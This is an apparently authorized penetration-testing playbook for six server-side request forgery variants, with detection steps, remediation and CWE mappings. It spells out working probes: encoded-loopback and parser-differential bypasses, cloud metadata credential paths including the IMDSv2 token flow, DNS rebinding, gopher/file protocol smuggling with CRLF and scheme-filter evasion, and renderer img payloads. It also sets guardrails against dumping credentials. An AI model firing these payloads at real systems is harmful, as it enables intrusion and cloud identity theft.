# SSRF Variants (V-01 … V-06)

Deep playbook sections for all six SSRF variants. Work the **Detect**
steps in order, climb the probing ladder in `payloads.md` only as far as
authorization and impact proof require, and check **False positives**
before writing anything up.

## Table of contents

- [V-01: Internal network mapping via basic SSRF scanning mechanisms](#v-01-internal-network-mapping-via-basic-ssrf-scanning-mechanisms)
- [V-02: Infrastructure verification via asynchronous blind SSRF pipelines](#v-02-infrastructure-verification-via-asynchronous-blind-ssrf-pipelines)
- [V-03: Cloud infrastructure takeover via metadata API instance extraction](#v-03-cloud-infrastructure-takeover-via-metadata-api-instance-extraction)
- [V-04: Network restriction bypass via automated TTL DNS rebinding](#v-04-network-restriction-bypass-via-automated-ttl-dns-rebinding)
- [V-05: SSRF via protocol smuggling (Gopher/DICT/FTP tunnelling)](#v-05-ssrf-via-protocol-smuggling-gopherdictftp-tunnelling)
- [V-06: SSRF via PDF/image rendering engines and cross-origin objects](#v-06-ssrf-via-pdfimage-rendering-engines-and-cross-origin-objects)

## V-01: Internal network mapping via basic SSRF scanning mechanisms

**Mechanism:** The server fetches a URL/hostname/IP chosen by the attacker
(webhook, import-from-URL, link preview, avatar fetch). The violated
assumption is "the destination is not attacker-controlled": DNS resolution
and TCP connect happen from the server's network position, which typically
trusts localhost, RFC1918, and link-local ranges the attacker cannot reach
directly.

**Preconditions:**
- A URL/hostname/IP parameter that triggers a server-side fetch
- Needed schemes pass (`http/https` at minimum; more in V-05)
- No destination allowlist, or a parser differentials defeat it
- Fetch happens synchronously or its result is visible (else V-02)

**Detect:**
1. Find fetch points: `url`, `webhook`, import/export-from-URL, PDF/print,
   oEmbed/link preview, avatar-from-URL, "check site" health tools.
2. Rung 1 (safe): point at `http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-001` —
   collaborator DNS+HTTP hit proves *server-side* fetch (check source IP:
   server's ASN, non-browser UA — a hit from the victim's browser is client-
   side, not SSRF).
3. Climb the ladder in `payloads.md` §1: localhost → loopback aliases →
   decimal/hex/octal encodings → link-local → internal ranges. Record which
   rungs respond.
4. Reflected vs blind: does the response body contain fetched content?
   Full-read SSRF is a different severity tier — say which you have.
5. Filter bypass notes to try inline: parser differentials
   (`http://allowed.tld#@127.0.0.1`, `http://allowed.tld@127.0.0.1`),
   redirect-based bypass (your box 302s to internal after an allowlisted
   check), IPv6 (`[::ffff:7f00:1]`), DNS names resolving to loopback
   (`localtest.me`, `127.0.0.1.nip.io`).
6. Port mapping via differentials (in-scope ranges only, slow pacing):
   open → app-level response, refused → fast error, filtered → timeout.
   Two samples per port plus a control to defeat noise.

**Proof of concept:**
```
GET /api/fetch?url=<PLACEHOLDER_URL> HTTP/1.1

rung 1: url=http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-001
rung 2: url=http://127.0.0.1:<PORT>/
rung 3: url=http://127.0.0.1.nip.io/
```

**Confirm:** Collaborator HTTP hit (server IP + fetcher UA) *and* either
fetched internal content reflected or a reproducible timing differential
against a control port. Both must survive a re-send.

**False positives:** Frontend link previews that fetch from the *user's*
browser (hit comes from your IP/browser UA). DNS prefetch/metadata scrapers
on marketing pages. CDN edge fetches (hit from CDN IP, not origin). Apps
that merely *reflect* the hostname you gave without fetching (echo ≠ SSRF —
the collaborator check is exactly what rules this out). "Port open" claims
from single timing samples.

**Impact:** Reachability into localhost and the internal network: internal
admin panels, databases with default creds (report reachability, don't
brute-force), and stepping-stone to V-03 metadata. Phrase as "server-side
fetch to arbitrary destinations incl. `<rungs reached>` from app egress IP
`<IP>`".

**Remediation:** Egress-filter at the network layer (deny RFC1918,
link-local, metadata ranges) *and* validate URLs at the app layer against an
allowlist of exact hosts, resolving once and pinning the IP; disable redirects.

**CWE / OWASP:** CWE-918 (Server-Side Request Forgery); OWASP A10:2021
Server-Side Request Forgery; WSTG — Testing for SSRF.

## V-02: Infrastructure verification via asynchronous blind SSRF pipelines

**Mechanism:** The fetch runs in a background worker (queue, cron, webhook
test, "process this URL" job) so the HTTP response never reflects fetched
content. Detection therefore depends entirely on out-of-band side channels —
DNS/HTTP callbacks, job-state changes, timing of completion — which is why
this variant is missed when testers only look at response bodies.

**Preconditions:**
- An async feature that takes an attacker URL (webhook test, import job,
  PDF-by-email, sitemap/news crawler)
- The worker has egress (often *more* than the web tier — no WAF in path)
- Some attribution channel: OOB domain, job status/log the tester can read

**Detect:**
1. Trigger the job with `url=http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-<TOKEN>`
   — a **unique path per test** so late/duplicate hits stay attributable.
2. Watch the collaborator (DNS *and* HTTP) while recording the enqueue
   time; async hits arrive seconds-to-minutes later — correlation, not
   simultaneity, is the signal.
3. Log full request headers on your callback server: Go-http-client,
   python-requests, `Go-http-client/2.0` fingerprints the worker stack for
   later variants (V-05/V-06).
4. Rule out victim-side fetches: hits showing browser UA, your own egress
   IP, or arriving while the page is open = client-side; hits with server
   UA/ASN after the tab closes = server-side.
5. If job logs/errors are visible, inject URLs producing distinguishable
   failures (DNS-fail vs connection-refused vs HTTP 500) to map reachability
   *without* OOB — error differentials are a second, independent channel.
6. Use OOB DNS-only variants (`nslookup <TOKEN>.<OOB>`) when HTTP egress is
   filtered but DNS isn't — workers often leak DNS via internal resolvers.

**Proof of concept:**
```
POST /api/jobs HTTP/1.1
Content-Type: application/json

{"target_url": "http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-<TOKEN>", "type": "preview"}
```

**Confirm:** Unique-path hit on your collaborator from a non-browser
source/ASN *and* a second signal (job-status change or error differential
tied to target state) that reproduces on re-trigger. Timing alone or a bare
DNS hit alone is a lead.

**False positives:** Your own earlier tests' delayed hits — unique tokens
fix this. Email security gateways / link unfurlers following stored URLs
(hit UA/ASN says "scanner", not app). Cached jobs replaying old payloads.
Victim-side prefetch on SPA apps (check source IP). Shared-collaborator
cross-talk between engagements — namespace your domain per test.

**Impact:** Blind but real: internal port-state mapping via job timing,
fetcher fingerprinting for follow-up variants, and (with V-05/V-06) turning
async fetches into protocol-level or exfil-capable SSRF. Phrase as
"server-side fetch from background worker, OOB confirmed at `<timestamp>`,
destination fully attacker-controlled". Do not trigger job floods — pacing is
part of the no-destructive rule.

**Remediation:** Run workers in an egress-restricted network namespace with
a destination allowlist; queue-time URL validation plus re-validation at
fetch; surface the fetch target to users so suspicious jobs are visible.

**CWE / OWASP:** CWE-918 (SSRF); OWASP A10:2021 SSRF.

## V-03: Cloud infrastructure takeover via metadata API instance extraction

**Mechanism:** Cloud instances expose a link-local metadata service (AWS
`169.254.169.254`, GCP `metadata.google.internal`/`169.254.169.254` +
`Metadata-Flavor: Google` header, Azure `169.254.169.254/metadata` +
`Metadata: true` header, Alibaba `100.100.100.200`). Any SSRF (V-01/V-02/V-04/
V-05/V-06) from that network position becomes cloud-identity theft: the
instance's IAM role, service account, or VM identity is attacker-choosable
to use. IMDSv2 adds a PUT-token session (`X-aws-ec2-metadata-token-ttl-seconds`)
which blocks naive GET-only SSRF but falls to SSRF that controls verb/headers
(gopher-style, V-05) or to environments where IMDSv2 is still optional.

**Preconditions:**
- App runs on AWS/GCP/Azure/Alibaba/etc. (or Kubernetes with cluster IP)
- Egress to link-local/metadata not blocked (no `169.254.169.254` deny rule)
- IMDSv1 allowed (AWS) *or* SSRF supports PUT + custom headers for the v2 token
- Required headers reachable: GCP/Azure need `Metadata-Flavor`/`Metadata`
  (absence still yields 400/403 = reachability signal)

**Detect:**
1. **Guardrail first: prove by identifying the role/instance — never dump
   credentials.** Decide up front that `/iam/security-credentials/` (name
   only), `service-accounts/default/email`, and `vmId` are your evidence.
2. Reachability probes (ladder rung 4 in `payloads.md`):
   AWS v1 `GET /latest/meta-data/`; GCP with `Metadata-Flavor: Google`;
   Azure with `Metadata: true`. Timeouts mean not-a-cloud-box — not a finding.
3. IMDSv2 flow: `PUT /latest/api/token` with
   `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then `GET` with the token
   header. Only attempt if your SSRF controls verb+headers (V-05); if the
   app only forwards plain GETs and IMDSv2 is enforced, the correct outcome
   is "SSRF present, metadata blocked by IMDSv2" — a real, honest note.
4. Identity evidence: AWS fetch
   `/latest/meta-data/iam/security-credentials/` → role **name**; GCP fetch
   `.../service-accounts/default/email`; Azure fetch
   `/metadata/instance/compute/vmId?api-version=2021-02-01`; Alibaba fetch
   `.../ram/security-credentials/` → role name. **Stop there.**
5. Kubernetes/ECS variants: task-metadata `169.254.170.2` and cluster IP
   reachability are the same class — identify *which* task/service account,
   redact any token material the API hands back.

**Proof of concept:**
```
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ <PLACEHOLDER_ROLE_NAME>            # role NAME only — credential JSON NOT retrieved

# IMDSv2 through a verb/header-controlling SSRF (V-05):
PUT /latest/api/token  X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/iam/security-credentials/  X-aws-ec2-metadata-token: <TOKEN>
```

**Confirm:** The role name / VM id / service-account email (environment-
unique data reflection cannot fake) *plus* repeatability on a second fetch.
That is sufficient — two signals, zero credentials.

**False positives:** Timeout on `169.254.169.254` from a non-cloud box is a
non-finding. IMDSv2-enforced accounts have no credential exposure even with
perfect SSRF — do not claim takeover. Dev laptops with AWS CLI env vars do
not imply metadata exists. 400/403 from GCP/Azure *without* the required
header still proves reachability (error-type differential), but a generic
app-level "blocked URL" page reflects nothing — check who generated the
response. Alpine/busybox images without curl don't change SSRF facts —
don't mistake tooling errors for filter blocks.

**Impact:** "SSRF → cloud metadata → instance can assume role `<NAME>`";
describe the role's *implied* permissions from its name/policy class if
known. **Report without retaining credentials:** no token JSON in evidence,
no screenshots of secrets, no use of the credentials for any action — the
role name plus the fetch proves it. Severity: Critical when the role is
powerful.

**Remediation:** Enforce IMDSv2 with hop limit 1 (`HttpPutResponseHopLimit`),
block link-local/metadata egress at the instance firewall/VPC policy, move to
short-lived workload identity with least privilege, and apply SSRF fixes
from V-01.

**CWE / OWASP:** CWE-918 (SSRF) with CWE-522 (sensitive credential exposure);
OWASP A10:2021 SSRF; Cloud Security Alliance metadata-hardening guidance.

## V-04: Network restriction bypass via automated TTL DNS rebinding

**Mechanism:** The fetcher validates a hostname (resolve → check IP against a
deny/allowlist) and then connects by *resolving again* — a classic TOCTOU.
Attacker-controlled DNS answers "safe public IP" to the validator and
"internal/metadata IP" to the connector (TTL 0 or alternating answers).
The violated assumption is "the checked IP is the connected IP"; filters
that block `127.0.0.1` literals fall without any allowlist bypass at all.

**Preconditions:**
- SSRF filter resolves/validates before fetch, fetcher re-resolves (no pinning)
- Attacker controls DNS for a domain: an authoritative NS you run, or a
  rebinding service (`rbndr`-style alternating A records)
- Resolver/load-balancer does not cache long enough to defeat the flip
  (positive TTL caching is the main obstacle)

**Detect:**
1. Establish the two-resolution pattern: direct `http://127.0.0.1/` is
   blocked, but `http://<YOUR_DOMAIN>/` passes the filter — filter is
   hostname-or-IP-based and yours resolves "clean" initially.
2. Set up automated TTL rebinding (payloads.md §3): your NS alternates
   A records `public_ip` / `127.0.0.1`, TTL 0; run many attempts because
   resolvers cache the first answer (Go's resolver, JVM, LB caches).
3. Probe order: rebind `public → 127.0.0.1` first (prove internal read with
   localhost content in the response), then `public → 169.254.169.254`
   (identity-only evidence per V-03's rule).
4. Cheap variant worth testing first: **redirect-based** — filter checks the
   initial URL only, your endpoint 302s to `http://127.0.0.1/`. Often the
   whole finding without any DNS trickery; same impact class.
5. Automate: script loop `{ rebind → fetch → check marker } 100x`, look for
   the first hit containing localhost-specific content (headers, body size
   band, internal banner).

**Proof of concept:**
```
GET /api/fetch?url=http://<PLACEHOLDER_REBIND_DOMAIN>/ HTTP/1.1

1st DNS answer (validator):  <PUBLIC_IP>       → passes filter
2nd DNS answer (connector):  127.0.0.1         → internal fetch
# then: 169.254.169.254 → identity proof only (V-03 rules apply)
```

**Confirm:** Internal content / metadata identity appears *through* your
hostname while direct `http://127.0.0.1/` is still blocked — the differential
is the proof of filter bypass; reproduce it at least twice (rebinding is
flaky, so log the flip sequence).

**False positives:** The filter actually re-resolves and pins: your "rebind"
responses came from the public IP serving 200s that merely *look* internal —
compare body contents against a direct fetch of your public server. Static
loopback DNS names (`localtest.me`, `nip.io`) are **not** rebinding — they
test V-01 encoding bypasses; don't label them V-04. CDN-hosted targets
resolving from anycast edges produce convincing-but-wrong diffs.

**Impact:** Turns partial/naive SSRF into full localhost + metadata access —
phrase as "hostname-based SSRF filter bypassed via DNS rebinding →
`<rungs reached>` reachable", with V-03 identity evidence where applicable.

**Remediation:** Resolve once, validate that IP, and connect to the pinned
IP; re-validate after every redirect; enforce IP-range deny at connect time
(server-side socket level), not just at URL-parse time.

**CWE / OWASP:** CWE-918 (SSRF, TOCTOU); CWE-367 (Race Condition);
OWASP A10:2021 SSRF.
## V-05: SSRF via protocol smuggling (Gopher/DICT/FTP tunnelling)

**Mechanism:** The fetcher passes non-HTTP schemes through — `gopher://`
sends attacker bytes raw over TCP, `dict://`/`ftp://`/`tftp://` speak other
protocols, `file://` reads local paths. A plain SSRF escalates from "make an
HTTP request" to "write arbitrary bytes to an arbitrary internal TCP port":
verb control, header smuggling (CRLF), and direct talks to Redis, Memcached,
SMTP, and internal HTTP admin surfaces.

**Preconditions:**
- The app's HTTP client passes the scheme through (older curl/libcurl,
  urllib/requests stacks of certain eras, some Java/Go fetchers, desktop-ish
  WebView bridges) — modern stacks disable gopher/file by default, so
  **verify through the app, never from your local `curl -V`**
- Target service speaks a protocol you can encode in the payload
- SSRF parameter accepts full URLs (scheme not stripped)

**Detect:**
1. Scheme ladder (safe → deeper): `file:///etc/hostname` (read-class — note
   it, chain LFI detail with `path-traversal-testing`),
   `dict://<OOB_DOMAIN>:80/info:`, `ftp://<OOB_DOMAIN>/`,
   `gopher://<OOB_DOMAIN>:80/_MARKER`. Differentiate errors: "unsupported
   scheme" (dead end) vs connection attempt (reachable).
2. Safe proof first: point gopher at **your own** listener and send a
   marker byte string — arrival with exact bytes proves raw-byte control
   with zero internal impact. This is the required first step, per ladder.
3. Fingerprint the client from your listener's received bytes (ClientHello/
   header order/`User-Agent`) to pick encoding strategy (CRLF placement,
   `_` prefix, URL-encoding depth).
4. Escalation (in-scope only): gopher'd HTTP with `%0d%0a` CRLF to inject
   verbs/headers into an internal service you can otherwise observe;
   FTP passive-mode pivot (fetcher connects to you, you 301 to internal).
5. Evasion notes: `%0d%0a` for newlines, `%00` tolerated by some parsers,
   double-URL-encoding when the app decodes twice, `_` payload prefix
   required by gopher. Check scheme filters case-insensitively
   (`GoPhEr:`) and with leading whitespace/backslashes.

**Proof of concept:**
```
GET /api/fetch?url=<PLACEHOLDER_URL> HTTP/1.1

byte-control: url=gopher://<PLACEHOLDER_LISTENER>:9999/_HELLO<%0d%0a>MARKER
internal:     url=gopher://<PLACEHOLDER_INTERNAL_HOST>:<PORT>/_<URL_ENCODED_PAYLOAD>
read-class:   url=file:///etc/hostname
```

**Confirm:** Marker bytes arrive at your listener exactly as encoded
(byte-level match = you control payload content) **and**, for internal
claims, an observable state change on an in-scope service you can verify
through a legitimate channel. Never prove this with destructive commands —
lab depth only for write-primitive chains.

**False positives:** "Gopher works" inferred from local tooling instead of
the app's own fetcher. Hits on your listener produced by your own client
timing, not the server (check source IP). Internal HTTP 200 reached via
gopher that plain SSRF would equally reach — same severity, fancier
technique; don't inflate. `file://` "read" of content the app also reflects
from a normal param = not LFI.

**Impact:** SSRF→protocol control: internal auth-less service access (Redis/
Memcached/SMTP), HTTP verb/header injection past internal-only checks, and
`file://` local reads. Phrase the reachable *protocols and services*, cite
the byte-control proof, and keep write-primitive chains (e.g., Redis
`CONFIG SET`) as lab-demonstrated potential.

**Remediation:** Strict scheme allowlist (`https:` only) applied after URL
parsing, reject non-HTTP on redirect, and upgrade HTTP clients (modern
libcurl ships without gopher/dict/tftp).

**CWE / OWASP:** CWE-918 (SSRF) with CWE-93 (CRLF/header injection);
OWASP A10:2021 SSRF.

## V-06: SSRF via PDF/image rendering engines and cross-origin objects

**Mechanism:** Server-side renderers (wkhtmltopdf, Chromium print-to-PDF,
WeasyPrint, Puppeteer, ImageMagick, LibreOffice, OCR pipelines) fetch
subresources referenced in documents: `<img src>`, CSS `url()`, `@font-face`,
SVG `<image href>`, PDF XObjects/`/URI`. A document feature becomes SSRF —
and, when the renderer embeds fetched bytes into the returned PDF/image,
SSRF **with an exfiltration channel**: internal page content lands in the
file the attacker downloads.

**Preconditions:**
- A render feature (HTML/markdown → PDF, invoice/report export, image
  resize-from-URL, SVG rasterize) accepts attacker-influenced content or URL
- Renderer runs with network access (default in many deploys)
- Returned artifact reflects subresource content (exfil tier) or callback
  timing (blind tier)

**Detect:**
1. Find the feature: "Print/PDF export", "save as PDF", HTML→PDF APIs,
   image-proxy/resize endpoints, logo-from-URL, OCR of fetched docs.
2. Safe probe: plant `http://<PLACEHOLDER_OOB_DOMAIN>/pdf-<TOKEN>.png` as
   an `<img>` (or CSS `url()`) in input you control; trigger the render;
   expect a collaborator hit fingerprinting the renderer UA — no internal
   target touched yet.
3. Climb (ladder rung 4/5): swap the src to `http://127.0.0.1:<PORT>/`,
   then metadata per V-03 — **identity fields only**, never credentials.
4. Exfil tier: if fetched content is embedded in the returned artifact,
   download it and extract the one marker/hostname needed as proof. Note
   CSS/DNS-exfil techniques in the report as *capability*; demonstrating
   one marker suffices — bulk data theft is prohibited (guardrail).
5. Renderer gotchas: WeasyPrint blocks some schemes; wkhtmltopdf disables
   JS but still loads images/fonts; Chromium needs `networkidle` waits
   (delayed hits are normal); rendered-doc caches dedupe re-fetches — vary
   the `<TOKEN>` per attempt.

**Proof of concept:**
```
POST /api/export HTTP/1.1
Content-Type: application/json

{"html": "<img src=\"http://<PLACEHOLDER_OOB_DOMAIN>/pdf-<TOKEN>.png\">"}   # callback
# then:  src=http://127.0.0.1/ or http://169.254.169.254/... (identity only)
# exfil: src=http://<internal>/admin → marker appears in returned PDF
```

**Confirm:** Collaborator HTTP hit for the planted resource (renderer UA,
source = app egress IP) **and** — when claiming full-read — the fetched
content present in the returned artifact, extracted as a single marker.
Two signals; re-render with a fresh token to show repeatability.

**False positives:** Client-side print (browser fetches from the *victim's*
network — check hit UA/source IP). Image proxies that HEAD/validate against
an allowlist before fetching (validation fetch ≠ app fetch — verify origin).
Hits produced by your own browser previewing the document. CDN/cached PDFs
returned without re-render (no hit = retest with cache-buster).

**Impact:** SSRF with an exfiltration channel — internal admin content
returned inside the downloaded artifact, plus metadata reachability (V-03
rules) — typically Critical. Phrase as "server-side renderer fetches
arbitrary URLs incl. `<rungs>`; fetched content embedded in output artifact".

**Remediation:** Render in network-namespaced containers with egress deny;
disable remote resource loading (Chromium `--disable-remote-fonts`/offline
mode, wkhtmltopdf `--disable-external-links`, WeasyPrint URL fetch
overrides); sanitize doc HTML to an allowlist of tags/attrs with no URLs.

**CWE / OWASP:** CWE-918 (SSRF) with CWE-73 (external file/name control);
OWASP A10:2021 SSRF.

